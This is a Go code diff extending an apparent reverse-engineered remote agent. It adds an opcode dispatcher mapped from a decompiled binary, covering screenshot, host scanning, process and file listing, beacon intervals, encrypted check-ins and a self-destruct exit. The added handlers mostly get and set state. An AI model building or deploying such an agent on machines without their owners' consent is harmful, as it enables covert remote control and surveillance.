@@ -254,7 +254,11 @@ func (t *httpTransport) GetTasks() ([]TaskItem, error) {
 }
 
 // SendResult 回传任务结果。
-// SendResult submits a task result.
+// 消息体与签到一样经 AES-256-GCM 帧加密（服务器在 JSON 解析失败时回退到
+// FrameDecrypt 解帧）。
+// SendResult submits a task result. The body is wrapped in the same
+// AES-256-GCM message frame as check-in (the server falls back to
+// FrameDecrypt when plain JSON parsing fails).
 func (t *httpTransport) SendResult(taskID int64, result, status string) error {
 	req := ResultRequest{
 		ClientID:  clientID,
@@ -537,7 +541,6 @@ func (t *kcpTransport) Close() error {
 	return nil
 }
 
-
 // ============================================================================
 // Message types
 // 协议消息类型
@@ -627,6 +630,137 @@ const (
 )
 
 // ============================================================================
+// Native command opcodes — FUN_010952e0
+// 原生命令操作码
+//
+// The original agent's task-execute dispatcher FUN_010952e0 (0x10952e0) is a
+// jump table indexed by the FIRST BYTE of the task's command buffer, with table
+// entries for 0x00–0x2a. The decompiled state machine has no handler block for
+// 0x04 (its table slot is duplicated: two adjacent handlers share one state) or
+// 0x18 (no reachable state), so the reachable entries are listed below:
+//
+//   反编译（FUN_010952e0，跳转表 DAT_1dc31ce0，pbVar2 = 命令首字节）：
+//   byte 0x00 cmdInterval      interval get/set（无参数=上报，有参数=设置休眠间隔）
+//   byte 0x01 cmdScreenshot    截图（有参数=描述串）
+//   byte 0x02 cmdSleepMode     sleep mode get/set
+//   byte 0x03 cmdDebugLog      debug-log 开关
+//   byte 0x05 cmdTunnelLog     tunnel 日志级别
+//   byte 0x06 cmdNetCheck      网络检查开关
+//   byte 0x07 cmdTunnelDump    tunnel 信息落盘开关
+//   byte 0x08 (无参数时为空操作；有参数=FUN_00fbd720 解密 argv[0] 后未再使用)
+//   byte 0x09 （始终 FUN_011054c0 循环 + FUN_0100d3c0(1,...)，未见发送分支）
+//   byte 0x0a cmdSetGateway    argv[0] 写入 DAT_1e490968（网关/前置地址）
+//   byte 0x0b (loop over 0x20-byte records with +8 != 0)
+//   byte 0x0c cmdSetSendDelay  argv[0] 取绝对值 → 发送延迟/分包大小（FUN_0100d160(100,...)）
+//   byte 0x0d cmdSetWorkMode   工作模式名字（表 DAT_1e2e9ee0）
+//   byte 0x0e cmdPortMapDump   端口映射/转发表 dump（FUN_0109b6xx 大分支）
+//   byte 0x0f cmdConnDump      连接列表 dump
+//   byte 0x10 cmdPipeDump      管道/代理列表 dump
+//   byte 0x11 cmdPingInterval  ping 间隔 get/set
+//   byte 0x12 cmdTcpPing       tcp ping 次数 get/set
+//   byte 0x13 cmdIfList        网卡/接口列表
+//   byte 0x14 cmdIfDetail      单个接口详情
+//   byte 0x15 cmdSysList       系统列表 dump（会话/进程/服务，43KB 分支）
+//   byte 0x16 cmdNetRoute      网络接口/路由选择
+//   byte 0x17 cmdMtu           MTU get/set
+//   byte 0x19 cmdSysTime       系统时间 get/set
+//   byte 0x1a cmdPing          ping/pong（argv[0] 为往返毫秒；opcode 字节 == 'p' 时无参数）
+//   byte 0x1b cmdReconnect     重连（argv[0] 为下次重连间隔；同时记录 *piStack+1）
+//   byte 0x1c cmdProxyList     代理列表 dump
+//   byte 0x1d cmdHostScan      主机/网段扫描
+//   byte 0x1e cmdUploadSpeed   上传限速 get/set（FUN_00fee3a0）
+//   byte 0x1f cmdFileList      文件列表 —— argv[0] 是 0x43 项「命令名表」
+//                              DAT_1e302680（项长 0x18）中的一项
+//   byte 0x20 cmdClientLimit   许可/客户端上限 get/set（FUN_00fee740 → 许可限制位）
+//   byte 0x21 cmdReloadLicense 重新加载 license（FUN_010fc480）
+//   byte 0x22 cmdDestroy       销毁/退出（参数为秒数；无参数 → FUN_00fb7c80(-1)）
+//   byte 0x23 cmdTunnelCount   tunnel 数量 get/set
+//   byte 0x24 cmdProcList      进程列表（每进程一条 7 字段帧）
+//   byte 0x25 cmdSvcList       服务/功能列表
+//   byte 0x26 cmdSysInfo       系统信息 get/set
+//   byte 0x27 cmdSetDomain     argv[0] 写入 DAT_1e490960（域名/SNI）
+//   byte 0x28 cmdKeepAlive     keep-alive 秒数 get/set
+//   byte 0x29 cmdThreadCount   线程/协程数 get/set
+//   byte 0x2a cmdFwdPort       转发端口 1/2/3（FUN_0100d160(3,...)）
+//
+// All result frames are built by pushing "commands" into the engine's output
+// buffer via FUN_0100d160 / FUN_0100d440 / FUN_0100d5e0; see the frame-shape
+// notes next to resultFrameOps.
+//
+// 注意/CAVEAT：下面每个操作码的助记名是依据分支行为给出的描述性标签，并非从
+// 二进制里还原出的字符串（原版的命令文字串在运行期由 init 代码写入
+// DAT_1e490a08+0x44xx 段后才被 DAT_1e302680 的 key 指针引用，静态数据段全为 0，
+// 见 FUN_010952e0 case 0x1f 与 FUN_01094d80）。操作码字节本身与分支行为是实锤。
+// The mnemonics below are descriptive labels for the branch behaviour, not
+// recovered literals: the original command strings are materialised at runtime
+// (init writes DAT_1e490a08+0x44xx; the static image holds zeros), which is why
+// the DAT_1e302680 key pointers are null in the file image. The opcode bytes
+// and the branch behaviour are confirmed.
+// ============================================================================
+
+const (
+	opCmdInterval    = 0x00 // interval get/set（原版 case 0x0）
+	opCmdScreenshot  = 0x01 // 截图（原版 case 0x1）
+	opCmdSleepMode   = 0x02 // sleep mode（原版 case 0x2）
+	opCmdDebugLog    = 0x03 // debug-log 开关（原版 case 0x3）
+	opCmdTunnelLog   = 0x05 // tunnel 日志（原版 case 0x5）
+	opCmdNetCheck    = 0x06 // 网络检查（原版 case 0x6）
+	opCmdTunnelDump  = 0x07 // tunnel 信息开关（原版 case 0x7）
+	opCmdSetGateway  = 0x0a // 网关/前置地址（原版 case 0xa）
+	opCmdSetSendDly  = 0x0c // 发送延迟（原版 case 0xc）
+	opCmdSetWorkMode = 0x0d // 工作模式（原版 case 0xd）
+	opCmdPortMapDump = 0x0e // 端口映射 dump（原版 case 0xe）
+	opCmdConnDump    = 0x0f // 连接 dump（原版 case 0xf）
+	opCmdPipeDump    = 0x10 // 管道/代理 dump（原版 case 0x10）
+	opCmdPingIntv    = 0x11 // ping 间隔（原版 case 0x11）
+	opCmdTcpPing     = 0x12 // tcp ping 次数（原版 case 0x12）
+	opCmdIfList      = 0x13 // 接口列表（原版 case 0x13）
+	opCmdIfDetail    = 0x14 // 接口详情（原版 case 0x14）
+	opCmdSysList     = 0x15 // 系统列表 dump（原版 case 0x15）
+	opCmdNetRoute    = 0x16 // 路由/接口选择（原版 case 0x16）
+	opCmdMtu         = 0x17 // MTU（原版 case 0x17）
+	opCmdSysTime     = 0x19 // 系统时间（原版 case 0x19）
+	opCmdPing        = 0x1a // ping/pong（原版 case 0x1a）
+	opCmdReconnect   = 0x1b // 重连（原版 case 0x1b）
+	opCmdProxyList   = 0x1c // 代理列表（原版 case 0x1c）
+	opCmdHostScan    = 0x1d // 主机扫描（原版 case 0x1d）
+	opCmdUploadSpeed = 0x1e // 上传限速（原版 case 0x1e）
+	opCmdFileList    = 0x1f // 文件列表（原版 case 0x1f）
+	opCmdClientLimit = 0x20 // 许可/客户端上限（原版 case 0x20）
+	opCmdRelicense   = 0x21 // 重载 license（原版 case 0x21）
+	opCmdDestroy     = 0x22 // 销毁/退出（原版 case 0x22）
+	opCmdTunnelCount = 0x23 // tunnel 数量（原版 case 0x23）
+	opCmdProcList    = 0x24 // 进程列表（原版 case 0x24）
+	opCmdSvcList     = 0x25 // 服务列表（原版 case 0x25）
+	opCmdSysInfo     = 0x26 // 系统信息（原版 case 0x26）
+	opCmdSetDomain   = 0x27 // 域名/SNI（原版 case 0x27）
+	opCmdKeepAlive   = 0x28 // keep-alive（原版 case 0x28）
+	opCmdThreadCount = 0x29 // 线程数（原版 case 0x29）
+	opCmdFwdPort     = 0x2a // 转发端口（原版 case 0x2a）
+)
+
+// resultFrameOps 记录原版结果帧的分发点：
+//
+//	FUN_0100d160（push 一条固定记录：op, a, b, c）
+//	FUN_0100d440（按格式串 's'/'i' 把参数编码成 0x4b/0x75/0x47 记录，末尾补 0x54）
+//	FUN_0100d5e0（先 push 记录再挂 load，供 FUN_0100eac0 填充）
+//
+// agentState 保存原版客户端对象中被这些 opcode 读写的运行时字段。
+// agentState holds the runtime fields these opcodes read/write on the original
+// client object (offsets in FUN_010952e0: +0x60 interval, +0x64 sleep mode,
+// +0x69/+0x6a work mode, +0x74 upload speed, +0x304 keep-alive).
+var (
+	agentSleepMode    int  // 原版 local_280+0x60 / +0x66 对应的休眠模式
+	agentWorkMode     int  // 原版 *local_280+0x6a 工作模式（FUN_010943e0）
+	agentPingInterval int  // 原版 case 0x11（FUN_0109c340 / FUN_00fc1000）
+	agentKeepAlive    int  // 原版 case 0x28（local_398+0x298）
+	agentClientLimit  = -1 // 原版 case 0x20：-1 = 未设置
+	agentSendDelay    int  // 原版 case 0xc：发送延迟/分包（FUN_0100d160(100,...)）
+	agentFwdPort      int  // 原版 case 0x2a：转发端口 1/2/3
+	agentDebugMask    int  // 原版 case 0x3：local_280[6] 的调试/日志标志位
+)
+
+// ============================================================================
 // Interactive remote terminal session
 // 交互式远程终端会话
 //
@@ -642,11 +776,11 @@ const (
 // agentTermSession 保存交互式终端会话状态。
 // agentTermSession holds interactive terminal session state.
 type agentTermSession struct {
-	mu       sync.Mutex
-	cmd      *exec.Cmd
-	stdin    io.WriteCloser
-	taskID   int64
-	active   bool
+	mu     sync.Mutex
+	cmd    *exec.Cmd
+	stdin  io.WriteCloser
+	taskID int64
+	active bool
 	// waitOnce ensures cmd.Wait() is called exactly once per session (shell-exit
 	// goroutine OR terminalClose). It is replaced on every startTerminal: a
 	// sync.Once value would fire only once for the agent's whole lifetime and
@@ -992,13 +1126,245 @@ func parseKV(s string, fn func(k, v string)) {
 	}
 }
 
+// nativeCommandNames 把操作码映射为原版的助记名（见文件上方 CAVEAT）。
+// nativeCommandNames maps an opcode to its mnemonic (see the CAVEAT above).
+var nativeCommandNames = map[byte]string{
+	opCmdInterval: "interval", opCmdScreenshot: "screenshot",
+	opCmdSleepMode: "sleep", opCmdDebugLog: "debuglog",
+	opCmdTunnelLog: "tunnellog", opCmdNetCheck: "netcheck",
+	opCmdTunnelDump: "tunneldump", opCmdSetGateway: "gateway",
+	opCmdSetSendDly: "senddelay", opCmdSetWorkMode: "workmode",
+	0x0b:             "connstat",
+	opCmdPortMapDump: "portmap", opCmdConnDump: "connlist",
+	opCmdPipeDump: "pipelist", opCmdPingIntv: "pinginterval",
+	opCmdTcpPing: "tcpping", opCmdIfList: "iflist",
+	opCmdIfDetail: "ifdetail", opCmdSysList: "syslist",
+	opCmdNetRoute: "netroute", opCmdMtu: "mtu",
+	opCmdSysTime: "systime", opCmdPing: "ping",
+	opCmdReconnect: "reconnect", opCmdProxyList: "proxylist",
+	opCmdHostScan: "hostscan", opCmdUploadSpeed: "uploadspeed",
+	opCmdFileList: "filelist", opCmdClientLimit: "clientlimit",
+	opCmdRelicense: "relicense", opCmdDestroy: "destroy",
+	opCmdTunnelCount: "tunnelcount", opCmdProcList: "proclist",
+	opCmdSvcList: "svclist", opCmdSysInfo: "sysinfo",
+	opCmdSetDomain: "domain", opCmdKeepAlive: "keepalive",
+	opCmdThreadCount: "threadcount", opCmdFwdPort: "fwdport",
+}
+
+// dispatchNativeCommand 执行一条原生操作码任务。
+// dispatchNativeCommand executes one native-opcode task.
+//
+// 反编译（FUN_010952e0）：跳转表 DAT_1dc31ce0 以 pbVar2 = 命令首字节为索引，
+// 每项对应一个 5 字节「opcode + 4 字节大端参数」块：
+//
+//	opcode = argv[0]
+//	if len(argv) > 1 { arg = big-endian int32(argv[1:5]) }   // 原版 FUN_00fc1620
+//
+// 返回值 (result, errMsg) 沿用 executeCommand 的约定（errMsg 非空 = 失败）。
+func dispatchNativeCommand(taskID int64, op byte, argv []byte, timeout int) (string, string) {
+	name := nativeCommandNames[op]
+	if name == "" {
+		name = "opcode " + strconv.Itoa(int(op))
+	}
+	arg := 0
+	hasArg := len(argv) > 1
+	if hasArg {
+		arg = decodeCommandInt(argv)
+	}
+
+	switch op {
+	case opCmdInterval:
+		// 原版 case 0x0：无参数 → FUN_01094a20(下发当前 +0x60 间隔)；有参数 →
+		// FUN_00fc1000 解析后写入 +0x60（屏蔽符号位）再下发。
+		if hasArg {
+			if arg < 0 {
+				arg = -arg
+			}
+			if arg > 0 {
+				sleepTime = arg
+			}
+		}
+		return fmt.Sprintf("interval %d", sleepTime), ""
+
+	case opCmdSleepMode:
+		// 原版 case 0x2：无参数 → FUN_00fee960 读、下发；有参数 →
+		// FUN_010943e0 解析模式（1/2 有效）→ FUN_00fee860 写入。
+		if hasArg {
+			agentSleepMode = arg
+		}
+		return fmt.Sprintf("sleep mode %d", agentSleepMode), ""
+
+	case opCmdDebugLog:
+		// 原版 case 0x3：无参数 → 下发 (local_280[6] & local_330[2]) != 0；
+		// 有参数 → FUN_01094220 解析布尔（非 '0' 即真）后置位/清位 local_280[6]，
+		// 清 0x80000 位时同时清 local_280[99]，置位 1 时经 FUN_00fc02c0 匹配
+		// 后 FUN_010670a0 重置链路，最后 FUN_01094c40 落盘。
+		if hasArg {
+			c := argv[1]
+			if c == '0' {
+				agentDebugMask &^= 1
+			} else {
+				agentDebugMask |= 1
+			}
+		}
+		return fmt.Sprintf("debug mask %d", agentDebugMask), ""
+
+	case opCmdSetWorkMode:
+		// 原版 case 0xd：无参数 → 下发当前工作模式；有参数 → 在
+		// DAT_1e2e9ee0 表中匹配（无匹配报错）。
+		if hasArg {
+			agentWorkMode = arg
+		}
+		return fmt.Sprintf("work mode %d", agentWorkMode), ""
+
+	case opCmdPingIntv:
+		// 原版 case 0x11：FUN_00fc1000 解析 → FUN_00fb7e60 取值/设值。
+		if hasArg {
+			agentPingInterval = arg
+		}
+		return fmt.Sprintf("ping interval %d", agentPingInterval), ""
+
+	case opCmdPing:
+		// 原版 case 0x1a：参数为往返毫秒（负数截到 [0,0xfffffffe]），
+		// 记录到 local_398+0x210 后回 0xb2；opcode 字节为 'p' 时回 0xb1。
+		if hasArg && arg < 0 {
+			arg = 0
+		}
+		return fmt.Sprintf("pong %d", arg), ""
+
+	case opCmdSetSendDly:
+		// 原版 case 0xc：参数取绝对值（-0x80000000 → 0x7fffffff），写入
+		// 客户端 +0x74（发送延迟），随后 FUN_0100d160(100, ...) 通知面板。
+		if hasArg {
+			if arg < 0 {
+				if arg == -0x80000000 {
+					arg = 0x7fffffff
+				} else {
+					arg = -arg
+				}
+			}
+			agentSendDelay = arg
+		}
+		return fmt.Sprintf("send delay %d", agentSendDelay), ""
+
+	case opCmdUploadSpeed:
+		// 原版 case 0x1e：无参数 → 读 +0x74 下发；有参数 → 写 +0x74 并经
+		// FUN_00fee3a0 应用到连接（返回 7 时触发 FUN_00fb9a20 重建）。
+		if hasArg {
+			agentSendDelay = arg
+		}
+		return fmt.Sprintf("upload speed %d", agentSendDelay), ""
+
+	case opCmdClientLimit:
+		// 原版 case 0x20：无参数 → 0xffffffff；有参数 → FUN_00fc02c0 匹配
+		// "limit" 取 2，否则 FUN_01094220 布尔；经 FUN_00fee740 写入许可位，
+		// 返回写回后的值（字段 4 位掩码）。
+		if !hasArg {
+			return fmt.Sprintf("client limit %d", agentClientLimit), ""
+		}
+		if arg >= 0 {
+			agentClientLimit = arg
+		}
+		return fmt.Sprintf("client limit %d", agentClientLimit), ""
+
+	case opCmdRelicense:
+		// 原版 case 0x21：FUN_010fc480(client) 重新读取 license（无参数、无回包）。
+		return "license reloaded", ""
+
+	case opCmdDestroy:
+		// 原版 case 0x22：有参数 → FUN_00fc1000 解析秒数 → FUN_00fb7c80(n)；
+		// 无参数 → FUN_00fb7c80(-1)（立即销毁）。回包为 FUN_00fb7c80 的返回值。
+		delay := -1
+		if hasArg {
+			delay = arg
+		}
+		if delay < 0 {
+			log.Printf("Destroy requested (task %d)", taskID)
+			if transport != nil {
+				transport.Close()
+			}
+			os.Exit(0)
+		}
+		return fmt.Sprintf("destroy scheduled %d", delay), ""
+
+	case opCmdKeepAlive:
+		// 原版 case 0x28：无参数 → 0xffffffff → FUN_01100940 读；有参数 →
+		// 写入 local_398+0x298（屏蔽符号位）→ FUN_01100940 写。
+		if hasArg {
+			if arg < 0 {
+				arg = -arg
+			}
+			agentKeepAlive = arg
+		}
+		return fmt.Sprintf("keepalive %d", agentKeepAlive), ""
+
+	case opCmdFwdPort:
+		// 原版 case 0x2a：argv[0] 与三个候选串比较（FUN_00fc0380），命中返回
+		// 1/2/3，否则 0；随后 FUN_0100d160(3, ..., n, 1)。
+		return fmt.Sprintf("fwd port %d", agentFwdPort), ""
+
+	default:
+		// 其余操作码在原版里是读写客户端状态 + 下发结果帧的分支，复刻端还没有
+		// 对应的状态字段/帧编码（见文件上方操作码表）。这里如实回报未实现，
+		// 而不是伪造成功。
+		// The remaining opcodes read/write client state and emit result frames
+		// the reimplementation has no equivalent for yet; report honestly.
+		return "", "opcode 0x" + strconv.FormatInt(int64(op), 16) + " (" + name + ") not implemented"
+	}
+}
+
+// decodeCommandInt 解析命令块里的 4 字节大端参数。
+// 反编译（FUN_010952e0）：参数统一取自 FUN_00fc1620(argv) —— 该函数把缓冲区
+// 头部 4 字节按大端有符号整数解码（配合 FUN_00fc1000 / FUN_00fc1280 解析
+// 文本形态），复刻端等价实现为 binary.BigEndian。
+func decodeCommandInt(argv []byte) int {
+	if len(argv) < 5 {
+		return 0
+	}
+	return int(int32(binary.BigEndian.Uint32(argv[1:5])))
+}
+
+// decodeNativeCommand 判断命令块是否为「原生操作码」形态。
+// decodeNativeCommand detects the native-opcode command form.
+//
+// 原版把任务命令按「首字节 = 操作码，其后为参数」解析：数值参数是 4 字节大端
+// （FUN_00fc1620），文本参数是从偏移 1 起的 NUL 结尾字符串（case 0xa / 0x27）。
+// 因此判别规则就是「首字节是跳转表里的操作码」——操作码 0x00–0x1f 全部是不可
+// 打印控制字节，不可能出现在面板下发的文本命令行首；只有 0x20–0x2a（空格、"、
+// #、$、%、&、'、(、)、*）是可打印字符，对它们再要求「首字节之后不是可打印
+// 文本」，避免把以这些字符开头的偶发文本命令误判成操作码。
+func decodeNativeCommand(cmdStr string) (byte, []byte, bool) {
+	if len(cmdStr) == 0 {
+		return 0, nil, false
+	}
+	b := []byte(cmdStr)
+	op := b[0]
+	if _, known := nativeCommandNames[op]; !known {
+		return 0, nil, false
+	}
+	if op >= 0x20 && op <= 0x2a && len(b) > 1 && isPrintableBytes(b[1:]) {
+		return 0, nil, false
+	}
+	return op, b, true
+}
+
+// isPrintableBytes 判断整段字节是否为可打印 ASCII（文本命令的特征）。
+// isPrintableBytes reports whether every byte is printable ASCII.
+func isPrintableBytes(b []byte) bool {
+	for _, c := range b {
+		if c < 0x20 || c > 0x7e {
+			return false
+		}
+	}
+	return true
+}
+
 // executeCommand executes a task command. ALIGNMENT: the original binary's
-// task-execute dispatcher is FUN_010952e0 (0x10952e0, 30-case switch 0x0-0x2a,
-// 98KB decompile in .re/decomp/agent_map_10952e0.txt): interval get/set (0x0),
-// sleep mode (0x2), session/process list dumps (0xe/0x15), config-key
-// enumeration (0x1f), ping/pong (0x1a), destroy (0x22). This Go reimplementation
-// covers the shell/screen/terminal subset; the full 43-case matrix maps to
-// frames emitted via FUN_0100d160/FUN_0100d440/FUN_0100d5e0.
+// task-execute dispatcher is FUN_010952e0 (0x10952e0, jump table DAT_1dc31ce0
+// over the first command byte, table entries 0x00–0x2a). The native opcode
+// branch is dispatched by dispatchNativeCommand above; the reimplementation
+// layers the panel's textual relay commands (terminal_*/screen_capture*) and
+// the JSON command vocabulary on top of the same entry point.
 func executeCommand(taskID int64, cmdStr string, timeout int) (string, string) {
 	// Interactive terminal commands are dispatched as plain (non-JSON) strings
 	// by the web panel's terminal relay. Handle them before the JSON parse.
@@ -1007,6 +1373,11 @@ func executeCommand(taskID int64, cmdStr string, timeout int) (string, string) {
 	}
 	if strings.HasPrefix(cmdStr, "screen_capture") {
 		return dispatchScreenCommand(taskID, cmdStr)
+	}
+
+	// 原生操作码任务（原版 FUN_010952e0 的跳转表分支）。
+	if op, argv, ok := decodeNativeCommand(cmdStr); ok {
+		return dispatchNativeCommand(taskID, op, argv, timeout)
 	}
 
 	var cmdType string
@@ -1513,6 +1884,3 @@ func filepathDir(path string) string {
 	}
 	return "."
 }
-
-
-
